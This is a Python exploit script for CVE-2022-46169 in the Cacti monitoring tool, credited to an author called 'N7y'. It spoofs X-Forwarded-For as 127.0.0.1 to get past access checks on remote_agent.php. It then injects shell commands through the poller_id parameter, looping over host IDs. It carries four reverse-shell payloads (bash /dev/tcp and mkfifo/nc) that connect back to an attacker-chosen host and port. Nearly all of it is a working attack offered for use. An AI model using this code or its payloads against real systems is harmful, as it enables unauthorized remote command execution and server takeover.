import requests
import argparse
import sys

parser = argparse.ArgumentParser(description='Exploit for CVE-2022-46169')




parser.add_argument('--url', help='location to url of cacti')
parser.add_argument('--lhost',help="call back ip")
parser.add_argument('--lport',help="call back port")
args = parser.parse_args()
if len(sys.argv) == 1:
    print("""
            \r \r  Exploit for CVE-2022-46169
\t\t Auther: N7y

[...     [..                   
[. [..   [..[..... [..         
[.. [..  [..      [.. [..   [..
[..  [.. [..     [..   [.. [.. 
[..   [. [..    [..      [...  
[..    [. ..    [..       [..  
[..      [..    [..      [..   
                       [..  

    \r Usage is very human just
    \r CVE-2022-46169.py --url https://10.10.10.10/cacti --lhost 10.10.10.4 --lport 4001 

        """)
    exit()

if not args.url:
    print("need url to work with exiting...")
    exit()
else:
    url = args.url

if not args.lhost and not args.lport:
    print("exiting...")
    exit()
else:
    h = args.lhost
    p = args.lport







ids = [i for i in range(0,100)]
p1 = f"bash -i >& /dev/tcp/{h}/{p} 0>&1"
p2 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f"
p3 = f"sh -i >& /dev/tcp/{h}/{p} 0>&1"
p4 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {h} {p} >/tmp/f"


print("[*] ",url,"  --> ",h)
for i in range(0,100):
    
    headers = {'X-Forwarded-For': '127.0.0.1'}
    params = {'action': 'polldata', 'host_id': i,'poller_id': '1; bash -c "'+p1+'"', 'local_data_ids[]': ids}
    r = requests.get(url+'/remote_agent.php', params=params, headers=headers)
    print(r.url.split("?")[-1:][0])
    params = {'action': 'polldata', 'host_id': i,'poller_id': '1; bash -c "'+p2+'"', 'local_data_ids[]': ids}
    r = requests.get(url+'/remote_agent.php', params=params, headers=headers)
    print(r.url.split("?")[-1:][0])

    params = {'action': 'polldata', 'host_id': i,'poller_id': '1; bash -c "'+p3+'"', 'local_data_ids[]': ids}
    r = requests.get(url+'/remote_agent.php', params=params, headers=headers)
    print(r.url.split("?")[-1:][0])

    params = {'action': 'polldata', 'host_id': i,'poller_id': '1; bash -c "'+p4+'"', 'local_data_ids[]': ids}
    r = requests.get(url+'/remote_agent.php', params=params, headers=headers)
    print(r.url.split("?")[-1:][0])

    if 'proc' in r.text:
        print("[*] success!")
        exit()

#not vuln
print("\n")
